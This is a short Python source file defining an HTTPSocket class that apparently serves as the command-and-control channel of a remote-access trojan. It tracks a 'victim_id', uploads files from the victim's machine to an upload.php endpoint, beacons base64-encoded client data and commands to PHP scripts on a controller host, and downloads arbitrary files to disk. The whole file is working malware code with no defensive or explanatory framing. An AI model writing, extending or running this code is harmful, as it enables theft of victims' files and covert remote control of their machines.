import requests, base64

class HTTPSocket:
    def __init__(self, host, victim_id):
        self.host = host
        self.victim_id = victim_id

    def _GET(self, filename, request):
        requests.get(url=self.host + filename, params=request, timeout=15)

    def _POST(self, filename, request):
        requests.post(url=self.host + filename, data=request, timeout=15)

    def Upload(self, filepath):
        url = self.host + "upload.php"
        files = {'file': open(filepath, 'rb')}
        victim_id_param = { 'id' : base64.b64encode(self.victim_id.encode('UTF-8'))}
        requests.post(url, files=files, params=victim_id_param, timeout=30) # Increased timeout for uploads

    def Connect(self, clientdata):
        payload = { 'data': base64.b64encode(clientdata.encode('UTF-8')) } 
        self._GET("connection.php", payload)        

    def Send(self,command):
        payload = {'command': base64.b64encode(command.encode()), 'vicID': base64.b64encode(self.victim_id.encode())}
        self._GET("receive.php", payload)
 
    def Log(self, type, message):
        self.Send("NewLog" + "|BN|" + type + "|BN|" + message)
        
    def Download(self, url, destinationPath):
        file = requests.get(url, timeout=30) # Increased timeout for downloads
        open(destinationPath, 'wb').write(file.content)